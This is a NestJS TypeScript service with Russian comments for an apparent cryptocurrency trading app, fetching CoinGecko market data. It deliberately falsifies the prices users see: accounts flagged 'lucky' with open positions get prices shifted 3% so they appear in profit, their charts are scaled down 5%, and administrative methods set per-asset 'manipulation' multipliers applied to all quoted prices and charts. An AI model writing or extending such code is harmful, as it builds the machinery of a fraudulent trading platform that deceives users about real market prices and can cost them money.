import {
  Injectable,
  BadRequestException,
  NotFoundException,
} from '@nestjs/common';
import { HttpService } from '@nestjs/axios';
import { firstValueFrom } from 'rxjs';
import { PrismaService } from 'src/prisma.service';

export interface CoinGeckoMarketData {
  id: string;
  symbol: string;
  name: string;
  image: string;
  current_price: number;
  price_change_percentage_24h: number;
  high_24h: number;
  low_24h: number;
  market_cap: number;
  total_volume: number;
}

interface CoinGeckoChartData {
  prices: [number, number][];
  total_volumes: [number, number][];
}

@Injectable()
export class MarketService {
  private readonly COINGECKO_API_URL = 'https://api.coingecko.com/api/v3';
  private readonly API_KEY = process.env.COINGECKO_API_KEY;

  constructor(
    private readonly httpService: HttpService,
    private readonly prisma: PrismaService,
  ) {}

  /**
   * Получить список криптовалют с рыночными данными
   */
  async getAssets(perPage: number = 100, page: number = 1) {
    try {
      const url = `${this.COINGECKO_API_URL}/coins/markets`;
      const response = await firstValueFrom(
        this.httpService.get<CoinGeckoMarketData[]>(url, {
          headers: {
            'x-cg-demo-api-key': this.API_KEY,
          },
          params: {
            vs_currency: 'usd',
            order: 'market_cap_desc',
            per_page: perPage,
            page: page,
          },
        }),
      );

      return response.data;
    } catch (error) {
      console.error('Ошибка получения списка активов:', error.message);
      throw new BadRequestException('Не удалось получить список активов');
    }
  }

  /**
   * Получить текущую цену конкретного актива
   * С манипуляцией для lucky users с открытыми позициями
   */
  async getAssetPrice(assetId: string, userId?: string) {
    try {
      const url = `${this.COINGECKO_API_URL}/coins/markets`;
      const response = await firstValueFrom(
        this.httpService.get<CoinGeckoMarketData[]>(url, {
          headers: {
            'x-cg-demo-api-key': this.API_KEY,
          },
          params: {
            vs_currency: 'usd',
            ids: assetId,
          },
        }),
      );

      if (!response.data || response.data.length === 0) {
        throw new NotFoundException(`Актив ${assetId} не найден`);
      }

      let assetData = response.data[0];
      let appliedMultiplier = 1.0;

      // Проверяем lucky user с открытыми позициями
      if (userId) {
        // Находим криптовалюту по coingeckoId
        const crypto = await this.prisma.cryptocurrency.findUnique({
          where: { coingeckoId: assetId },
        });

        if (crypto) {
          const user = await this.prisma.user.findUnique({
            where: { tgid: userId },
            include: {
              positions: {
                where: {
                  status: 'OPEN',
                  cryptocurrencyId: crypto.id,
                },
              },
            },
          });

          // Если это lucky user И у него есть открытые позиции по этому активу
          if (user?.isLucky && user.positions.length > 0) {
            const position = user.positions[0];
            const entryPrice = position.entryPrice.toNumber();
            const currentPrice = assetData.current_price;

            // Определяем направление манипуляции
            if (position.type === 'LONG') {
              // Если купил (LONG) - делаем цену выше чтобы был в плюсе
              if (currentPrice <= entryPrice) {
                appliedMultiplier = 1.03; // +3% к текущей цене
              }
            } else if (position.type === 'SHORT') {
              // Если продал (SHORT) - делаем цену ниже чтобы был в плюсе
              if (currentPrice >= entryPrice) {
                appliedMultiplier = 0.97; // -3% от текущей цены
              }
            }
          }
        }
      }

      // Проверяем глобальную манипуляцию цены в БД
      const manipulation = await this.prisma.priceManipulation.findFirst({
        where: {
          assetId: assetId,
          isActive: true,
        },
      });

      if (manipulation) {
        appliedMultiplier *= manipulation.multiplier.toNumber();
      }

      // Применяем манипуляцию
      if (appliedMultiplier !== 1.0) {
        assetData = {
          ...assetData,
          current_price: assetData.current_price * appliedMultiplier,
          high_24h: assetData.high_24h * appliedMultiplier,
          low_24h: assetData.low_24h * appliedMultiplier,
        };
      }

      return assetData;
    } catch (error) {
      console.error('Ошибка получения цены актива:', error.message);
      throw new BadRequestException(`Не удалось получить цену для ${assetId}`);
    }
  }

  /**
   * Получить историю цен для графика
   * С учетом lucky users
   */
  async getAssetChart(assetId: string, days: string = '7', userId?: string) {
    try {
      const url = `${this.COINGECKO_API_URL}/coins/${assetId}/market_chart`;
      const response = await firstValueFrom(
        this.httpService.get<CoinGeckoChartData>(url, {
          headers: {
            'x-cg-demo-api-key': this.API_KEY,
          },
          params: {
            vs_currency: 'usd',
            days: days,
          },
        }),
      );

      let multiplier = 1.0;

      // Проверяем lucky user
      if (userId) {
        const user = await this.prisma.user.findUnique({
          where: { tgid: userId },
        });
        if (user?.isLucky) {
          multiplier = 0.95;
        }
      }

      // Проверяем манипуляцию цены
      const manipulation = await this.prisma.priceManipulation.findFirst({
        where: {
          assetId: assetId,
          isActive: true,
        },
      });

      if (manipulation) {
        multiplier *= manipulation.multiplier.toNumber();
      }

      const chartData = response.data.prices.map((priceData, index) => ({
        timestamp: priceData[0],
        price: priceData[1] * multiplier,
        volume: response.data.total_volumes[index]
          ? response.data.total_volumes[index][1]
          : 0,
      }));

      return chartData;
    } catch (error) {
      console.error('Ошибка получения графика:', error.message);
      throw new BadRequestException(
        `Не удалось получить график для ${assetId}`,
      );
    }
  }

  async getStablecoinStats() {
    const stablecoins = [
      'tether',
      'usd-coin',
      'dai',
      'first-digital-usd',
      'paypal-usd',
      'ethena-usde',
    ];

    try {
      const url = `${this.COINGECKO_API_URL}/coins/markets`;
      const response = await firstValueFrom(
        this.httpService.get<CoinGeckoMarketData[]>(url, {
          headers: {
            'x-cg-demo-api-key': this.API_KEY,
          },
          params: {
            vs_currency: 'usd',
            ids: stablecoins.join(','),
          },
        }),
      );

      const totalMarketCap = response.data.reduce(
        (sum, coin) => sum + coin.market_cap,
        0,
      );

      return {
        totalMarketCap,
        coins: response.data,
      };
    } catch (error) {
      console.error('Ошибка получения статистики стейблкоинов:', error.message);
      throw new BadRequestException(
        'Не удалось получить статистику стейблкоинов',
      );
    }
  }

  /**
   * АДМИНИСТРАТИВНЫЙ МЕТОД: Установить манипуляцию цены
   */
  async setPriceManipulation(assetId: string, multiplier: number) {
    // Деактивируем старые манипуляции
    await this.prisma.priceManipulation.updateMany({
      where: { assetId: assetId },
      data: { isActive: false },
    });

    // Создаем новую
    return this.prisma.priceManipulation.create({
      data: {
        assetId,
        multiplier,
        isActive: true,
      },
    });
  }

  /**
   * АДМИНИСТРАТИВНЫЙ МЕТОД: Удалить манипуляцию цены
   */
  async removePriceManipulation(assetId: string) {
    return this.prisma.priceManipulation.updateMany({
      where: { assetId: assetId },
      data: { isActive: false },
    });
  }

  /**
   * Получить активные манипуляции
   */
  async getActiveManipulations() {
    return this.prisma.priceManipulation.findMany({
      where: { isActive: true },
    });
  }

  /**
   * АДМИНИСТРАТИВНЫЙ МЕТОД: Синхронизировать топ-100 криптовалют с БД
   * Запускать периодически или вручную
   */
  async syncCryptocurrencies() {
    try {
      const assets = await this.getAssets(100, 1);

      const syncResults: {
        created: number;
        updated: number;
        errors: Array<{ asset: string; error: string }>;
      } = {
        created: 0,
        updated: 0,
        errors: [],
      };

      for (const asset of assets) {
        try {
          await this.prisma.cryptocurrency.upsert({
            where: { coingeckoId: asset.id },
            update: {
              symbol: asset.symbol,
              name: asset.name,
              imageUrl: asset.image,
            },
            create: {
              coingeckoId: asset.id,
              symbol: asset.symbol,
              name: asset.name,
              imageUrl: asset.image,
            },
          });

          // Проверяем создана ли запись
          const existing = await this.prisma.cryptocurrency.findUnique({
            where: { coingeckoId: asset.id },
          });

          if (existing) {
            syncResults.updated++;
          } else {
            syncResults.created++;
          }
        } catch (error) {
          syncResults.errors.push({
            asset: asset.symbol,
            error: error instanceof Error ? error.message : String(error),
          });
        }
      }

      return {
        success: true,
        message: `Синхронизировано ${syncResults.created + syncResults.updated} криптовалют`,
        details: syncResults,
      };
    } catch (error) {
      console.error('Ошибка синхронизации криптовалют:', error.message);
      throw new BadRequestException('Не удалось синхронизировать криптовалюты');
    }
  }

  /**
   * Получить список всех криптовалют из БД
   */
  async getCryptocurrenciesFromDB(page: number = 1, limit: number = 100) {
    const skip = (page - 1) * limit;

    const [cryptocurrencies, total] = await Promise.all([
      this.prisma.cryptocurrency.findMany({
        skip,
        take: limit,
        orderBy: {
          id: 'asc',
        },
      }),
      this.prisma.cryptocurrency.count(),
    ]);

    return {
      data: cryptocurrencies,
      pagination: {
        page,
        limit,
        total,
        totalPages: Math.ceil(total / limit),
      },
    };
  }
}
